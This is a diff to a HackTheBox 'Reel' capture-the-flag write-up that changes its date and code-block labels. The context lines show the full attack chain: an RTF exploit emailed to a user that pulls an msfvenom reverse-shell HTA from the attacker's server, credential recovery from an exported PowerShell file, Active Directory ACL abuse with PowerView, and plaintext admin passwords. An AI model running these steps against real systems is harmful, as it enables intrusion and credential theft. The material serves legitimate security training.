@@ -1,6 +1,6 @@
 ---
 title: "Reel"
-date: 2025-06-20
+date: 2024-11-23
 categories:
   - HackTheBox
   - Active Directory
@@ -16,7 +16,7 @@ tags:
 
 ## Enumeration
 
-```bash
+```shell
 $ nmap -sC -sV -Pn -T4 --min-rate 5000 -p- 10.10.10.77
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-23 00:13 CET
 Nmap scan report for 10.10.10.77
@@ -101,7 +101,7 @@ Nmap done: 1 IP address (1 host up) scanned in 232.76 seconds
 
 We enter the `ftp` server with anonymous access and find a note and `.docx` files:
 
-```bash
+```shell
 $ ftp 10.10.10.77
 150 Opening ASCII mode data connection.
 05-28-18  11:19PM                 2047 AppLocker.docx
@@ -118,7 +118,7 @@ The note says to send a person an `rtf` file and he will convert it, so there is
 
 Using `exiftool` on the files, we find an email address:
 
-```bash
+```shell
 $ exiftool Windows\ Event\ Forwarding.docx 
 ...
 Zip File Name                   : [Content_Types].xml
@@ -131,7 +131,7 @@ So this person's email is `nico@megabank.com`.
 
 Now we can enumerate the `smtp` service and check if this email is valid:
 
-```bash
+```shell
 $ smtp-user-enum -M RCPT -D megabank.com -u nico -t 10.10.10.77
 Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
 
@@ -165,7 +165,7 @@ Using `searchsploit`, we get an interesting exploit:
 
 Generate the `rtf`:
 
-```bash
+```shell
 $ python2 41894.py -M gen -w yes.rtf -u http://10.10.14.11:8000/bad.hta            
 Generating normal RTF payload.
 
@@ -174,20 +174,20 @@ Generated yes.rtf successfully
 
 Generate the `hta` with `msfvenom`:
 
-```bash
+```shell
 $ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.11 lport=443 -f hta-psh -o bad.hta
 ```
 
 Now, using `sendEmail`, we send the `yes.rtf` to `nico` and create a listener on port `443`:
 
-```bash
+```shell
 $ sendEmail -t nico@megabank.com -u open -m yes -a yes.rtf -s 10.10.10.77 -f paco@megabank.com
 Nov 24 08:04:58 kali sendEmail[861336]: Email was sent successfully!
 ```
 
 Start a listener and a Python server and wait for `nico` to open the mail:
 
-```bash
+```shell
 $ rlwrap nc -lnvp 443
 listening on [any] 443 ...
 connect to [10.10.14.11] from (UNKNOWN) [10.10.10.77] 63152
@@ -210,7 +210,7 @@ type user.txt
 
 In the same folder, we have `cred.xml` that shows an XML created with PowerShell `Export-CliXml`:
 
-```bash
+```shell
 C:\Users\nico\Desktop>type cred.xml
 type cred.xml                                                                                                                
 <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
@@ -230,7 +230,7 @@ type cred.xml
 
 So we get the password in plain text using `clixml`:
 
-```bash
+```shell
 C:\Users\nico\Desktop>powershell -c "$cred=Import-CliXml -Path .\cred.xml; $cred.GetNetworkCredential() | Format-List *"
 powershell -c "$cred=Import-CliXml -Path .\cred.xml;$pass=$cred.GetNetworkCredential().Password;Write-Output $pass"
 UserName    : Tom
@@ -241,7 +241,7 @@ And we have `tom:1ts-mag1c!!!`.
 
 Let's try `ssh`:
 
-```bash
+```shell
 $ sshpass -p '1ts-mag1c!!!' ssh tom@10.10.10.77
 Microsoft Windows [Version 6.3.9600]                                                                                         
 (c) 2013 Microsoft Corporation. All rights reserved.                                                                         
@@ -262,7 +262,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 
 There is a file inside an audit folder:
 
-```bash
+```shell
 $ scp tom@10.10.10.77:'/C:/Users/tom/Desktop/AD Audit/BloodHound/Ingestors/acls.csv' .
 tom@10.10.10.77's password: 
 acls.csv
@@ -278,7 +278,7 @@ The ability to set the object owner is abusable by `Set-DomainObjectOwner`.
 The ability to write to the DACL is abusable by `Add-DomainObjectAcl`.
 The ability to reset a user’s password is abusable by `Set-DomainUserPassword`.
 
-```bash
+```shell
 PS C:\Users\tom\Desktop\AD Audit\BloodHound> Import-Module .\PowerView.ps1                                                   
 PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -Identity claire -OwnerIdentity tom                       
 PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword                                 
@@ -288,7 +288,7 @@ PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainUserPassword -Identity cl
 
 Now `ssh` with `claire`:
 
-```bash
+```shell
 $ ssh claire@10.10.10.77
 Microsoft Windows [Version 6.3.9600]                                                                                         
 (c) 2013 Microsoft Corporation. All rights reserved.                                                                         
@@ -305,7 +305,7 @@ net group backup_admins claire /add
 
 Now we can go to the `administrator` folder and there are multiple scripts in the backup scripts folder:
 
-```bash
+```shell
 PS C:\Users\Administrator\Desktop\Backup Scripts> dir | Select-String "Password"                                             
 
 BackupScript.ps1:1:# admin password                                                                                          
@@ -314,7 +314,7 @@ BackupScript.ps1:2:$password="Cr4ckMeIfYouC4n!"
 
 Try `administrator` with this password and:
 
-```bash
+```shell
 $ sshpass -p 'Cr4ckMeIfYouC4n!' ssh Administrator@10.10.10.77
 Microsoft Windows [Version 6.3.9600]                                                                                         
 (c) 2013 Microsoft Corporation. All rights reserved.
